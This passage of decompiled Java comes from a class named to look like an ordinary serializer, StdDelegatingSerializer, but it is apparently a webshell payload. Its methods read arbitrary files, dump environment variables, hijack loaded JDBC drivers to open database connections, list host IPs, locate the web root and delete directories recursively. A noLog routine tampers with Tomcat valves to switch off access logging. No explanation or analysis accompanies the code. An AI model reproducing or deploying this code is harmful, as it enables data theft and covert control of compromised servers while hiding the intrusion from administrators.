                int position = Integer.valueOf(positionString);
                int readByteNum = Integer.valueOf(readByteNumString);
                byte[] readData = new byte[readByteNum];
                FileInputStream fileInputStream = new FileInputStream(fileName);
                fileInputStream.skip(position);
                int readNum = fileInputStream.read(readData);
                fileInputStream.close();
                if (readNum == readData.length) {
                    return readData;
                }
                return StdDelegatingSerializer.copyOf(readData, readNum);
            }
            return "no mode".getBytes();
        }
        catch (Exception e) {
            return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
        }
    }

    public static byte[] copyOf(byte[] original, int newLength) {
        byte[] arrayOfByte = new byte[newLength];
        System.arraycopy(original, 0, arrayOfByte, 0, Math.min(original.length, newLength));
        return arrayOfByte;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public Map getEnv() {
        try {
            int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
            if (jreVersion < 5) {
                return null;
            }
            try {
                Method method;
                Class<?> clazz = class$6;
                if (clazz == null) {
                    Class<?> clazz2;
                    try {
                        clazz2 = Class.forName("java.lang.System");
                    }
                    catch (ClassNotFoundException classNotFoundException) {
                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                    }
                    clazz = class$6 = clazz2;
                }
                if ((method = clazz.getMethod("getenv", new Class[0])) != null) {
                    Class<?> clazz3 = method.getReturnType();
                    Class<?> clazz4 = class$7;
                    if (clazz4 == null) {
                        Class<?> clazz5;
                        try {
                            clazz5 = Class.forName("java.util.Map");
                        }
                        catch (ClassNotFoundException classNotFoundException) {
                            throw new NoClassDefFoundError(classNotFoundException.getMessage());
                        }
                        clazz4 = class$7 = clazz5;
                    }
                    if (clazz3.isAssignableFrom(clazz4)) {
                        return (Map)method.invoke(null, null);
                    }
                }
                return null;
            }
            catch (Exception e) {
                return null;
            }
        }
        catch (Exception e2) {
            return null;
        }
    }

    public String getDocBase() {
        try {
            return this.getRealPath();
        }
        catch (Exception e) {
            return e.getMessage();
        }
    }

    public static Connection getConnection(String url, String userName, String password) {
        Connection connection;
        block25: {
            connection = null;
            try {
                Class<?> clazz = class$8;
                if (clazz == null) {
                    try {
                        clazz = class$8 = Class.forName("java.sql.DriverManager");
                    }
                    catch (ClassNotFoundException classNotFoundException) {
                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                    }
                }
                Field[] fields = clazz.getDeclaredFields();
                Field field = null;
                int i = 0;
                while (i < fields.length) {
                    field = fields[i];
                    if (field.getName().indexOf("rivers") != -1) {
                        Class<?> clazz2 = class$9;
                        if (clazz2 == null) {
                            try {
                                clazz2 = Class.forName("java.util.List");
                            }
                            catch (ClassNotFoundException classNotFoundException) {
                                throw new NoClassDefFoundError(classNotFoundException.getMessage());
                            }
                        }
                        if (clazz2.isAssignableFrom(field.getType())) break;
                    }
                    field = null;
                    ++i;
                }
                if (field == null) break block25;
                field.setAccessible(true);
                List drivers = (List)field.get(null);
                Iterator iterator = drivers.iterator();
                while (iterator.hasNext() && connection == null) {
                    try {
                        Object object = iterator.next();
                        Driver driver = null;
                        Class<?> clazz3 = class$10;
                        if (clazz3 == null) {
                            try {
                                clazz3 = Class.forName("java.sql.Driver");
                            }
                            catch (ClassNotFoundException classNotFoundException) {
                                throw new NoClassDefFoundError(classNotFoundException.getMessage());
                            }
                        }
                        if (!clazz3.isAssignableFrom(object.getClass())) {
                            Field[] driverInfos = object.getClass().getDeclaredFields();
                            int i2 = 0;
                            while (i2 < driverInfos.length) {
                                Class<?> clazz4 = class$10;
                                if (clazz4 == null) {
                                    try {
                                        clazz4 = Class.forName("java.sql.Driver");
                                    }
                                    catch (ClassNotFoundException classNotFoundException) {
                                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                                    }
                                }
                                if (clazz4.isAssignableFrom(driverInfos[i2].getType())) {
                                    driverInfos[i2].setAccessible(true);
                                    driver = (Driver)driverInfos[i2].get(object);
                                    break;
                                }
                                ++i2;
                            }
                        }
                        if (driver == null) continue;
                        Properties properties = new Properties();
                        if (userName != null) {
                            properties.put("user", userName);
                        }
                        if (password != null) {
                            properties.put("password", password);
                        }
                        connection = driver.connect(url, properties);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        return connection;
    }

    public static String getLocalIPList() {
        ArrayList<String> ipList = new ArrayList<String>();
        try {
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();
                Enumeration<InetAddress> inetAddresses = networkInterface.getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = inetAddresses.nextElement();
                    if (inetAddress == null) continue;
                    String ip = inetAddress.getHostAddress();
                    ipList.add(ip);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return Arrays.toString(ipList.toArray());
    }

    public String getRealPath() {
        try {
            if (this.servletContext != null) {
                Class<?> clazz = this.servletContext.getClass();
                Class[] classArray = new Class[1];
                Class<?> clazz2 = class$2;
                if (clazz2 == null) {
                    try {
                        clazz2 = class$2 = Class.forName("java.lang.String");
                    }
                    catch (ClassNotFoundException classNotFoundException) {
                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                    }
                }
                classArray[0] = clazz2;
                Method getRealPathMethod = this.getMethodByClass(clazz, "getRealPath", classArray);
                if (getRealPathMethod != null) {
                    Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
                    if (retObject != null) {
                        return retObject.toString();
                    }
                    return "Null";
                }
                return "no method getRealPathMethod";
            }
            return "servletContext is Null";
        }
        catch (Exception e) {
            return e.getMessage();
        }
    }

    public void deleteFiles(File f) throws Exception {
        if (f.isDirectory()) {
            File[] x = f.listFiles();
            int i = 0;
            while (i < x.length) {
                File fs = x[i];
                this.deleteFiles(fs);
                ++i;
            }
        }
        f.delete();
    }

    Object invoke(Object obj, String methodName, Object[] parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                int i = 0;
                while (i < parameters.length) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                    ++i;
                }
            }
            Method method = this.getMethodByClass((Class) obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        }
        catch (Exception exception) {
            return null;
        }
    }

    Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            Method method = this.getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null) {
                return method.invoke(obj, parameters);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        Method method = null;
        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            }
            catch (Exception e) {
                cs = cs.getSuperclass();
            }
        }
        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Object method = null;
            Class<?> cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                }
                catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    private void noLog(Object servletContext) {
        try {
            Object applicationContext = StdDelegatingSerializer.getFieldValue(servletContext, "context");
            Object container = StdDelegatingSerializer.getFieldValue(applicationContext, "context");
            ArrayList<Object> arrayList = new ArrayList<Object>();
            while (container != null) {
                arrayList.add(container);
                container = this.invoke(container, "getParent", null);
            }
            int i = 0;
            while (i < arrayList.size()) {
                block18: {
                    try {
                        Object pipeline = this.invoke(arrayList.get(i), "getPipeline", null);
                        if (pipeline == null) break block18;
                        Object valve = this.invoke(pipeline, "getFirst", null);
                        while (valve != null) {
                            if (this.getMethodByClass(valve.getClass(), "getCondition", null) != null) {
                                Class<?> clazz = valve.getClass();
                                Class[] classArray = new Class[1];
                                Class<?> clazz2 = class$2;
                                if (clazz2 == null) {
                                    try {
                                        clazz2 = Class.forName("java.lang.String");
                                    }
                                    catch (ClassNotFoundException classNotFoundException) {
                                        throw new NoClassDefFoundError(classNotFoundException.getMessage());
                                    }
                                }
                                classArray[0] = clazz2;
                                if (this.getMethodByClass(clazz, "setCondition", classArray) != null) {
                                    String condition = (String)this.invoke((String)valve, "getCondition", new Object[0]);
                                    condition = condition == null ? "FuckLog" : condition;
                                    this.invoke(valve, "setCondition", new Object[]{condition});
                                    Class<?> clazz3 = this.servletRequest.getClass();
                                    Class[] classArray2 = new Class[2];
                                    Class<?> clazz4 = class$2;
                                    if (clazz4 == null) {
                                        try {
                                            clazz4 = Class.forName("java.lang.String");
                                        }
                                        catch (ClassNotFoundException classNotFoundException) {
                                            throw new NoClassDefFoundError(classNotFoundException.getMessage());
                                        }
                                    }
                                    classArray2[0] = clazz4;
                                    Class<?> clazz5 = class$2;
                                    if (clazz5 == null) {
                                        try {
                                            clazz5 = Class.forName("java.lang.String");
                                        }
                                        catch (ClassNotFoundException classNotFoundException) {
                                            throw new NoClassDefFoundError(classNotFoundException.getMessage());
                                        }
                                    }
                                    classArray2[1] = clazz5;
                                    Method setAttributeMethod = this.getMethodByClass(clazz3, "setAttribute", classArray2);
                                    setAttributeMethod.invoke(condition, condition);
                                    valve = this.invoke(valve, "getNext", null);
                                    continue;
                                }
                            }
                            valve = Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass()) ? this.invoke(valve, "getNext", null) : null;
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
                ++i;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static Class getClass(String name) {
        try {
            return Class.forName(name);
        }
        catch (Exception e) {
            return null;
        }
    }

    public static int bytesToInt(byte[] bytes) {
        int i = bytes[0] & 0xFF | (bytes[1] & 0xFF) << 8 | (bytes[2] & 0xFF) << 16 | (bytes[3] & 0xFF) << 24;
        return i;
    }

    public String base64Encode(String data) {
        return StdDelegatingSerializer.base64Encode(data.getBytes());
    }

    public static String base64Encode(byte[] src) {
        int off = 0;
        int end = src.length;
        byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        int linemax = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = off;
        int slen = (end - off) / 3 * 3;
        int sl = off + slen;
        if (linemax > 0 && slen > linemax / 4 * 3) {
            slen = linemax / 4 * 3;
        }
        int dp = 0;
        while (sp < sl) {
            int sl0 = Math.min(sp + slen, sl);
            int sp0 = sp;
            int dp0 = dp;
            while (sp0 < sl0) {
                int bits = (src[sp0++] & 0xFF) << 16 | (src[sp0++] & 0xFF) << 8 | src[sp0++] & 0xFF;
                dst[dp0++] = (byte)base64[bits >>> 18 & 0x3F];
                dst[dp0++] = (byte)base64[bits >>> 12 & 0x3F];
                dst[dp0++] = (byte)base64[bits >>> 6 & 0x3F];
                dst[dp0++] = (byte)base64[bits & 0x3F];
            }
            int dlen = (sl0 - sp) / 3 * 4;
            dp += dlen;
            sp = sl0;
        }
        if (sp < end) {
            int b0 = src[sp++] & 0xFF;
            dst[dp++] = (byte)base64[b0 >> 2];
            if (sp == end) {
                dst[dp++] = (byte)base64[b0 << 4 & 0x3F];
                if (doPadding) {
                    dst[dp++] = 61;
                    dst[dp++] = 61;
                }
            } else {
                int b1 = src[sp++] & 0xFF;
                dst[dp++] = (byte)base64[b0 << 4 & 0x3F | b1 >> 4];
                dst[dp++] = (byte)base64[b1 << 2 & 0x3F];
                if (doPadding) {
                    dst[dp++] = 61;
                }
            }
        }
        return new String(dst);
    }

    public static byte[] base64Decode(String base64Str) {
        if (base64Str.length() == 0) {
            return new byte[0];
        }
        byte[] src = base64Str.getBytes();
        int sp = 0;
        int sl = src.length;
        int paddings = 0;
        int len = sl - sp;
        if (src[sl - 1] == 61) {
            ++paddings;
            if (src[sl - 2] == 61) {
                ++paddings;
            }
        }
        if (paddings == 0 && (len & 3) != 0) {
            paddings = 4 - (len & 3);
        }
        byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
        int[] base64 = new int[256];
        Arrays.fill(base64, -1);
        int i = 0;
        while (i < toBase64.length) {
            base64[StdDelegatingSerializer.toBase64[i]] = i;
            ++i;
        }
        base64[61] = -2;
        int dp = 0;
        int bits = 0;
        int shiftto = 18;
        while (sp < sl) {
            int b = src[sp++] & 0xFF;
            if ((b = base64[b]) < 0 && b == -2) {
                if ((shiftto != 6 || sp != sl && src[sp++] == 61) && shiftto != 18) break;
                throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
            }
            bits |= b << shiftto;
            if ((shiftto -= 6) >= 0) continue;
            dst[dp++] = (byte)(bits >> 16);
            dst[dp++] = (byte)(bits >> 8);
            dst[dp++] = (byte)bits;
            shiftto = 18;
            bits = 0;
        }
        if (shiftto == 6) {
            dst[dp++] = (byte)(bits >> 16);
        } else if (shiftto == 0) {
            dst[dp++] = (byte)(bits >> 16);
            dst[dp++] = (byte)(bits >> 8);
        } else if (shiftto == 12) {
            throw new IllegalArgumentException("Last unit does not have enough valid bits");
        }
        if (dp != dst.length) {
            byte[] arrayOfByte = new byte[dp];
            System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
            dst = arrayOfByte;
        }
        return dst;
    }
}
